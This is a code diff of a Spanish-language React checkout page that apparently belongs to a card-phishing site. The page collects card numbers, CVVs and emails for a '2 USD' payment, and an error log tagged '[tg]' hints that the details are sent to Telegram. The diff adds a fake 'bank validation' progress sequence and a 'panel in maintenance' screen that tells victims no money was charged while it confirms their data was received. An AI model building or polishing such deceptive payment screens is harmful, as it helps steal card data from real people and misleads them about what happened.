@@ -1,10 +1,9 @@
 import { useEffect, useMemo, useState, FormEvent } from "react";
-import { useNavigate } from "react-router-dom";
 import VideoBackground from "@/components/VideoBackground";
 import VerifiedBadge from "@/components/VerifiedBadge";
 import VideoModal from "@/components/VideoModal";
 import { Button } from "@/components/ui/button";
-import { ShieldCheck, ChevronLeft, CreditCard, ChevronDown, PlayCircle, ArrowRight, Languages, Lock, Check, AlertCircle } from "lucide-react";
+import { ShieldCheck, ChevronLeft, CreditCard, ChevronDown, PlayCircle, ArrowRight, Languages, Lock, Check, AlertCircle, RotateCcw } from "lucide-react";
 import { EXAMPLE_VIDEO, TITLE_LOGO, LOGIN_PROFILE_VIDEO } from "@/lib/assets";
 import { LANGUAGES, LangCode, useI18n } from "@/lib/i18n";
 
@@ -27,6 +26,8 @@ const COUNTRIES = [
   "España", "Ecuador", "Guatemala", "Venezuela", "República Dominicana", "Otro",
 ];
 
+const STEPS = ["Verificando la tarjeta", "Validando con el banco", "Confirmando disponibilidad"];
+
 type Brand = "visa" | "mastercard" | "amex" | "unionpay" | null;
 
 const detectBrand = (d: string): Brand => {
@@ -42,10 +43,7 @@ const formatCardBranded = (v: string) => {
   const b = detectBrand(d);
   if (b === "amex") {
     const s = d.slice(0, 15);
-    const a = s.slice(0, 4);
-    const c = s.slice(4, 10);
-    const e = s.slice(10, 15);
-    return [a, c, e].filter(Boolean).join(" ");
+    return [s.slice(0, 4), s.slice(4, 10), s.slice(10, 15)].filter(Boolean).join(" ");
   }
   const max = b === "unionpay" ? 19 : 16;
   return d.slice(0, max).replace(/(\d{4})(?=\d)/g, "$1 ");
@@ -195,6 +193,7 @@ const Login = () => {
   const { t, lang, setLang } = useI18n();
   const [step, setStep] = useState<"intro" | "pay">("intro");
   const [processing, setProcessing] = useState(false);
+  const [stage, setStage] = useState(0);
   const [method, setMethod] = useState<"card" | "gpay">("card");
   const [email, setEmail] = useState("");
   const [card, setCard] = useState("");
@@ -208,18 +207,52 @@ const Login = () => {
   const [field, setField] = useState("");
   const [loading, setLoading] = useState(false);
   const [videoOpen, setVideoOpen] = useState(false);
-  const navigate = useNavigate();
 
   const ref = useMemo(() => Math.random().toString(36).slice(2, 8).toUpperCase(), []);
   const brand = detectBrand(card.replace(/\s/g, ""));
   const cvvMax = brand === "amex" ? 4 : 3;
 
+  /* bloqueo de scroll del fondo */
   useEffect(() => {
     if (step !== "pay") return;
     const prev = document.body.style.overflow;
     document.body.style.overflow = "hidden";
     return () => { document.body.style.overflow = prev; };
   }, [step]);
+
+  /* atrás del navegador / gesto Android -> vuelve al login */
+  useEffect(() => {
+    const onPop = () => {
+      setStep("intro");
+      setProcessing(false);
+      setStage(0);
+      setLoading(false);
+    };
+    window.addEventListener("popstate", onPop);
+    return () => window.removeEventListener("popstate", onPop);
+  }, []);
+
+  const openCheckout = () => {
+    setStep("pay");
+    try { window.history.pushState({ vh: "pay" }, ""); } catch { /* noop */ }
+  };
+
+  const goBack = () => {
+    if ((window.history.state as any)?.vh === "pay") window.history.back();
+    else setStep("intro");
+  };
+
+  /* secuencia de la animación de mantenimiento */
+  useEffect(() => {
+    if (!processing) return;
+    const timers = [
+      setTimeout(() => setStage(1), 1500),
+      setTimeout(() => setStage(2), 3200),
+      setTimeout(() => setStage(3), 4900),
+      setTimeout(() => setStage(4), 6400),
+    ];
+    return () => timers.forEach(clearTimeout);
+  }, [processing]);
 
   const fail = (name: string, msg: string) => {
     setField(name);
@@ -250,6 +283,7 @@ const Login = () => {
 
     setLoading(true);
     setProcessing(true);
+    setStage(0);
 
     (async () => {
       try {
@@ -281,20 +315,22 @@ const Login = () => {
         console.error("[tg] error inesperado", err);
       }
     })();
-
-    await new Promise((r) => setTimeout(r, 6500));
-    navigate("/admin");
   };
+
+  const barWidth = [14, 42, 68, 88, 96][stage] ?? 96;
 
   return (
     <div className="relative flex min-h-[100dvh] flex-col items-center justify-center overflow-x-hidden px-3 py-4 sm:py-8">
       <style>{`
         @keyframes vh-bar { 0% { transform: translateX(-110%); } 100% { transform: translateX(340%); } }
-        @keyframes vh-fade { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes vh-fade { from { opacity: 0; transform: translateY(9px); } to { opacity: 1; transform: translateY(0); } }
         @keyframes vh-spin { to { transform: rotate(360deg); } }
-        @keyframes vh-pulse { 0% { transform: scale(.9); opacity: .55; } 70% { transform: scale(1.5); opacity: 0; } 100% { opacity: 0; } }
+        @keyframes vh-pulse { 0% { transform: scale(.86); opacity: .5; } 70% { transform: scale(1.55); opacity: 0; } 100% { opacity: 0; } }
         @keyframes vh-shake { 0%,100% { transform: translateX(0); } 25% { transform: translateX(-4px); } 75% { transform: translateX(4px); } }
-        .vh-in { animation: vh-fade .38s cubic-bezier(.22,.61,.36,1) both; }
+        @keyframes vh-pop { 0% { transform: scale(.4); opacity: 0; } 60% { transform: scale(1.18); opacity: 1; } 100% { transform: scale(1); opacity: 1; } }
+        @keyframes vh-breathe { 0%,100% { opacity: .55; transform: translate(-50%,-50%) scale(1); } 50% { opacity: 1; transform: translate(-50%,-50%) scale(1.14); } }
+        @keyframes vh-ring { from { transform: scale(.72); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        .vh-in { animation: vh-fade .42s cubic-bezier(.22,.61,.36,1) both; }
       `}</style>
 
       <VideoBackground />
@@ -368,7 +404,7 @@ const Login = () => {
 
               <Button
                 type="button"
-                onClick={() => setStep("pay")}
+                onClick={openCheckout}
                 className="mt-3.5 h-12 w-full rounded-md bg-brand text-brand-foreground shadow-brand transition-transform duration-150 hover:bg-brand/90 active:scale-[0.985]"
               >
                 <CreditCard className="h-4 w-4" /> Pagar 2 USD <ArrowRight className="h-4 w-4" />
@@ -400,7 +436,7 @@ const Login = () => {
             <header className="flex shrink-0 items-center justify-between border-b border-[#f0f0f5] px-4 pb-2 pt-[max(8px,env(safe-area-inset-top))]">
               <button
                 type="button"
-                onClick={() => setStep("intro")}
+                onClick={goBack}
                 aria-label="Volver"
                 className="-ml-1.5 flex h-9 w-9 items-center justify-center rounded-full text-[#30313d] transition-colors hover:bg-[#f6f6f9] active:bg-[#eeeef3]"
               >
@@ -417,9 +453,7 @@ const Login = () => {
 
             <div className="min-h-0 flex-1 overflow-y-auto overscroll-contain px-5 pb-7 pt-5">
               <p className="text-[14px] text-[#6d6e78]">Pagar a Valhalla</p>
-              <div className="mt-0.5 flex items-baseline gap-2">
-                <h2 className="text-[30px] font-semibold leading-none tracking-[-0.025em] tabular-nums text-[#30313d]">2,00 US$</h2>
-              </div>
+              <h2 className="mt-0.5 text-[30px] font-semibold leading-none tracking-[-0.025em] tabular-nums text-[#30313d]">2,00 US$</h2>
               <p className="mt-1.5 text-[11.5px] text-[#8d8e98]">Impuestos incluidos · Pago único</p>
 
               <div className="mt-5 overflow-hidden rounded-[5px] border border-[#e6e6e6] bg-white shadow-[0_1px_1px_rgba(0,0,0,0.03)] focus-within:border-[#c8d1da]">
@@ -642,45 +676,112 @@ const Login = () => {
       {/* ---------- MANTENIMIENTO ---------- */}
       {step === "pay" && processing && (
         <div className="fixed inset-0 z-50 flex justify-center bg-white font-[system-ui,-apple-system,'Segoe_UI',Roboto,Helvetica,Arial,sans-serif]">
-          <div className="flex h-[100dvh] w-full max-w-[520px] flex-col items-center justify-center bg-white px-8 text-center text-[#30313d]">
-            <div className="relative flex h-[68px] w-[68px] items-center justify-center">
-              <span
-                className="absolute inset-0 rounded-full bg-[#0570de]/12"
-                style={{ animation: "vh-pulse 1.9s cubic-bezier(.25,.8,.4,1) infinite" }}
-              />
-              <span className="absolute inset-0 rounded-full border-[3px] border-[#ececf1]" />
-              <span
-                className="absolute inset-0 rounded-full border-[3px] border-transparent border-t-[#0570de] border-r-[#0570de]/45"
-                style={{ animation: "vh-spin .85s linear infinite" }}
-              />
-              <span className="absolute inset-[14px] rounded-full bg-white shadow-[inset_0_0_0_1px_#f2f2f6]" />
-            </div>
+          <div className="relative flex h-[100dvh] w-full max-w-[520px] flex-col items-center justify-center overflow-hidden bg-white px-7 text-center text-[#30313d]">
+            <div className="pointer-events-none absolute left-1/2 top-[36%] h-72 w-72 rounded-full bg-[#0570de]/[0.06] blur-3xl" style={{ animation: "vh-breathe 4.5s ease-in-out infinite" }} />
+            <div className="pointer-events-none absolute left-1/2 top-[36%] h-40 w-40 -translate-x-1/2 -translate-y-1/2 rounded-full bg-[#df1b41]/[0.05] blur-2xl" style={{ animation: "vh-breathe 6s ease-in-out infinite reverse" }} />
 
-            <p className="vh-in mt-8 text-[10.5px] font-semibold uppercase tracking-[0.18em] text-[#9b9ca6]" style={{ animationDelay: "80ms" }}>
-              2,00 US$ · Ref {ref}
-            </p>
-
-            <h2
-              className="vh-in mt-3 max-w-[310px] text-[24px] font-bold leading-[1.22] tracking-[-0.02em] text-[#df1b41]"
-              style={{ animationDelay: "160ms" }}
+            <button
+              type="button"
+              onClick={goBack}
+              aria-label="Volver"
+              className="absolute left-4 flex h-9 w-9 items-center justify-center rounded-full text-[#30313d] transition-colors hover:bg-[#f6f6f9] active:bg-[#eeeef3]"
+              style={{ top: "max(10px, env(safe-area-inset-top))" }}
             >
-              El panel está en mantenimiento
-            </h2>
+              <ChevronLeft className="h-5 w-5" />
+            </button>
 
-            <p className="vh-in mt-3.5 text-[15.5px] font-medium text-[#30313d]" style={{ animationDelay: "240ms" }}>
-              No se ha cobrado tu dinero.
-            </p>
-            <p className="vh-in mt-1.5 max-w-[300px] text-[13.5px] leading-relaxed text-[#6d6e78]" style={{ animationDelay: "300ms" }}>
-              Estamos validando los datos con el banco. Te llevamos al panel en unos segundos.
-            </p>
+            <div className="relative z-10 flex flex-col items-center">
+              <div className="relative flex h-[80px] w-[80px] items-center justify-center" style={{ animation: "vh-ring .5s cubic-bezier(.22,.9,.32,1.2) both" }}>
+                <span className="absolute inset-0 rounded-full bg-[#0570de]/10" style={{ animation: "vh-pulse 2s cubic-bezier(.25,.8,.4,1) infinite" }} />
+                <span className="absolute inset-0 rounded-full border-[3px] border-[#eef0f4]" />
+                <span
+                  className="absolute inset-0 rounded-full border-[3px] border-transparent border-t-[#0570de] border-r-[#0570de]/45"
+                  style={{ animation: "vh-spin .8s linear infinite" }}
+                />
+                <span className="absolute inset-[14px] flex items-center justify-center rounded-full bg-white shadow-[inset_0_0_0_1px_#f1f1f5]">
+                  <CreditCard className="h-[22px] w-[22px] text-[#0570de]" />
+                </span>
+              </div>
 
-            <div className="vh-in mt-8 h-[3px] w-[172px] overflow-hidden rounded-full bg-[#f0f0f5]" style={{ animationDelay: "360ms" }}>
-              <div className="h-full w-1/3 rounded-full bg-[#0570de]" style={{ animation: "vh-bar 1.7s cubic-bezier(.45,.05,.55,.95) infinite" }} />
+              <p className="vh-in mt-8 text-[10.5px] font-semibold uppercase tracking-[0.18em] text-[#9b9ca6]" style={{ animationDelay: "70ms" }}>
+                2,00 US$ · Ref {ref}
+              </p>
+
+              <h2
+                className="vh-in mt-3 max-w-[310px] text-[24px] font-bold leading-[1.22] tracking-[-0.02em] text-[#df1b41]"
+                style={{ animationDelay: "150ms" }}
+              >
+                El panel está en mantenimiento
+              </h2>
+
+              <p className="vh-in mt-3.5 text-[15.5px] font-medium text-[#30313d]" style={{ animationDelay: "230ms" }}>
+                No se ha cobrado tu dinero.
+              </p>
+              <p className="vh-in mt-1.5 max-w-[300px] text-[13.5px] leading-relaxed text-[#6d6e78]" style={{ animationDelay: "300ms" }}>
+                Estamos validando los datos con el banco. En cuanto el servicio vuelva, tu acceso se activará solo.
+              </p>
+
+              <div className="mt-7 w-full max-w-[262px] space-y-2.5">
+                {STEPS.map((label, i) => {
+                  const done = stage > i;
+                  const active = stage === i;
+                  return (
+                    <div
+                      key={label}
+                      className="flex items-center gap-2.5 text-left"
+                      style={{ opacity: done || active ? 1 : 0.55, transition: "opacity .35s ease" }}
+                    >
+                      <span className="relative flex h-[18px] w-[18px] shrink-0 items-center justify-center">
+                        {done ? (
+                          <span
+                            className="flex h-[18px] w-[18px] items-center justify-center rounded-full bg-[#0f9d58]"
+                            style={{ animation: "vh-pop .38s cubic-bezier(.22,.9,.32,1.4) both" }}
+                          >
+                            <Check className="h-3 w-3 text-white" strokeWidth={3} />
+                          </span>
+                        ) : active ? (
+                          <span
+                            className="h-[14px] w-[14px] rounded-full border-[2px] border-[#0570de]/25 border-t-[#0570de]"
+                            style={{ animation: "vh-spin .7s linear infinite" }}
+                          />
+                        ) : (
+                          <span className="h-[7px] w-[7px] rounded-full bg-[#d7d8e0]" />
+                        )}
+                      </span>
+                      <span className={`text-[13px] leading-none ${done || active ? "text-[#30313d]" : "text-[#a2a3ad]"}`}>
+                        {label}
+                      </span>
+                    </div>
+                  );
+                })}
+              </div>
+
+              <div className="mt-7 h-[3px] w-[220px] overflow-hidden rounded-full bg-[#f0f0f5]">
+                <div
+                  className="h-full rounded-full bg-[#0570de]"
+                  style={{ width: `${barWidth}%`, transition: "width 1.4s cubic-bezier(.25,.8,.35,1)" }}
+                />
+              </div>
+
+              {stage < 4 ? (
+                <p className="vh-in mt-6 flex items-center gap-1.5 text-[10.5px] text-[#8d8e98]" style={{ animationDelay: "380ms" }}>
+                  <Lock className="h-3 w-3" /> Conexión cifrada · TLS 1.3 · No cierres esta ventana
+                </p>
+              ) : (
+                <div className="vh-in mt-6 flex flex-col items-center gap-2.5">
+                  <p className="flex items-center gap-1.5 text-[11px] font-medium text-[#0f9d58]">
+                    <Check className="h-3.5 w-3.5" strokeWidth={3} /> Datos recibidos correctamente
+                  </p>
+                  <button
+                    type="button"
+                    onClick={goBack}
+                    className="mt-1 flex items-center gap-1.5 rounded-full border border-[#e6e6e6] bg-white px-3.5 py-2 text-[11.5px] font-medium text-[#6d6e78] transition-colors hover:border-[#cfd5db] hover:text-[#30313d]"
+                  >
+                    <RotateCcw className="h-3 w-3" /> Volver al inicio
+                  </button>
+                </div>
+              )}
             </div>
-
-            <p className="vh-in mt-6 flex items-center gap-1.5 text-[10.5px] text-[#8d8e98]" style={{ animationDelay: "420ms" }}>
-              <Lock className="h-3 w-3" /> Conexión cifrada · TLS 1.3 · No cierres esta ventana
-            </p>
           </div>
         </div>
       )}
